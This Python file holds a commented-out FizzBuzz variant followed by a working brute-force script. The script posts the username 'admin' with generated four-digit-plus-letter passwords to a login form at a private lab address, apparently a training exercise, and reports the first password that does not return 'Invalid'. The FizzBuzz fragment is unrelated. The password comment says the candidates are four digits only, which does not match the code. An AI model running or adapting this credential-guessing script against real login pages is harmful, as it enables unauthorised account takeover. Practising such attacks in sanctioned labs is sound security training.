'''i=1
a=1
def fizzbuzz(num):
   for i in  range(1,num+1):
    if i % 3 == 0 and i  % 7 == 0:
        print("FizzBuzz")
        
    elif i  % 3 == 0:
        print("Fizz")

    elif i % 7 == 0:
    
        print("Buzz")
    elif '3' in str(i):
        print("Almost Fizz")
          
    else:
        
        print(i)

# Example usage
num = int(input())
fizzbuzz(num)
 checking github .com'''

import requests
import string
url = "http://10.10.184.96/labs/lab1/"

username = "admin"

# Generating 4-digit numeric passwords (0000-9999
password_list = [str(i).zfill(4) + letter for i in range(10000) for letter in string.ascii_lowercase]


def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()   